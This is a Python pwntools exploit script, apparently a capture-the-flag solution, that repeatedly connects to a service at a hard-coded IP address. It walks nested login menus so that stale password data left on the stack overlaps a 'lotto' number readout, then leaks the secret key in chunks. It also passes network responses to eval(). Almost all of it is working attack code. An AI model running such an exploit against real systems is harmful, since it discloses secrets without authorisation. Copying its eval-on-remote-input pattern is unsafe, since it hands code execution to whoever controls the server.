from pwn import *
# context(log_level='debug')

# for offset in (0,0x80,0x10):
offset = 0
values = []
for i in range(4):
    # r = remote('localhost', '9988')
    r = remote('54.208.86.14', '9988')

    r.recvrepeat(); r.sendline('');      # Login #0

    r.recvrepeat(); r.sendline('login'); # Login #1
    r.recvrepeat(); r.sendline('X'*0x80);  # Skip login

    r.recvrepeat(); r.sendline('login'); # Login #2
    r.recvrepeat(); r.sendline('C'*(0x1 + i*0x10));      # Skip login


    r.recvrepeat(); r.sendline('login')  # Login #3
    r.recvrepeat(); r.send('root\x00')   # ROOT
    r.recvrepeat(); r.send(cyclic(0x40)) # Fail password, don't clear from memory

    r.recvrepeat(); r.sendline('exit')   # Drop out from Login #2 to Login #1

    r.recvrepeat(); r.sendline('login')  # Log back into #2
    r.recvrepeat(); r.sendline('A'*(0x4C - offset)) # With less stuff on stack

    # r.recvrepeat(); r.sendline('login')  # In Login #2, re-login to #3
    # r.recvrepeat(); r.sendline('')
    # r.recvrepeat(); r.sendline('exit')   # Drop out from Login #2 to Login #1
    # r.recvrepeat(); r.sendline('')
    # r.recvrepeat(); r.sendline('root' + 'A' * 0x10 + '\x00')
                                         # Asjust stack for Login #2...
    r.recvrepeat(); r.sendline('lotto')  # So that lotto numbers overlap with password

    r.recvrepeat(); r.sendline('6')     # Send a number larger than four
    r.recvrepeat(); r.sendline('6')     # Trash number 1
    r.recvrepeat(); r.sendline('6')     # Trash number 2
    r.recvrepeat(); r.sendline('6')     # Trash number 3
    r.recvrepeat(); r.sendline('6')     # Trash number 4

    result = ''
    while 'The correct numbers' not in result:
        result = r.recvline()

    values.append(r.recvline())

values = eval('[' + ', '.join(values) + ']')

print ''.join(map(p32, values))

# With key set up as:
# python -c 'print "".join("KEY%x" % x for x in range(0x10))' >! key
#
# You should see values that look like: 878265675
#
# These correspond to key values.
#
# python -c 'from pwn import *; print p32(878265675)'
# KEY4